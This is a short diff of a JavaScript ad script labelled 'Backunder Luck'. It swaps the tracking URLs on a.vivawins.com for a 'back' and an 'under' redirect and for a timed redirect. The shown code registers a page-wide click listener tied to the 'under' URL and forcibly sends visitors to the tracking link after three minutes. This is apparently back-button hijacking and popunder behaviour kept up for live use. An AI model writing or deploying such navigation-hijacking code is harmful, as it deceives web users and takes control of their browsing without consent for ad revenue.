@@ -1,6 +1,6 @@
 // Backunder Luck
-var back = 'https://a.vivawins.com/visit/5a58e058-c985-4634-82d4-dd97bef6b880?cost=[bid]&src_clid=[clickid]&subid=[subid]&zoneid=[zoneid]&campaignid=[campaignid]&creativeid=[creativeid]&subscriptionage=[subscriptionage]&country=[country]&os=[os]&browser=[browser]&carrier=[carrier]&connectiontype=[connectiontype]&region=[region]&city=[city]&osversion=[osversion]&browserversion=[browserversion]&bid=[bid]';
-var under = 'https://a.vivawins.com/visit/0b968054-fb69-4c9e-9de4-32de5782273a?cost=[bid]&src_clid=[clickid]&subid=[subid]&zoneid=[zoneid]&campaignid=[campaignid]&creativeid=[creativeid]&subscriptionage=[subscriptionage]&country=[country]&os=[os]&browser=[browser]&carrier=[carrier]&connectiontype=[connectiontype]&region=[region]&city=[city]&osversion=[osversion]&browserversion=[browserversion]&bid=[bid]';
+var back = 'https://a.vivawins.com/visit/5a58e058-c985-4634-82d4-dd97bef6b880?track=BackButton';
+var under = 'https://a.vivawins.com/visit/0b968054-fb69-4c9e-9de4-32de5782273a?track=Under';
 
 if (typeof under !== "undefined" && under !== null) {
     document.addEventListener('click', function(event) {
@@ -30,7 +30,7 @@ if (typeof back !== "undefined" && back !== null) {
 
 // Redirect Function
 function redirectAfterDelay() {
-    const redirectUrl = "https://a.vivawins.com/click";
+    const redirectUrl = "https://a.vivawins.com/visit/487b00df-a676-4fe5-8348-c4ee6287da4d?track=Redirect";
     setTimeout(() => {
         window.location.href = redirectUrl;
     }, 180000); // 3 минуты
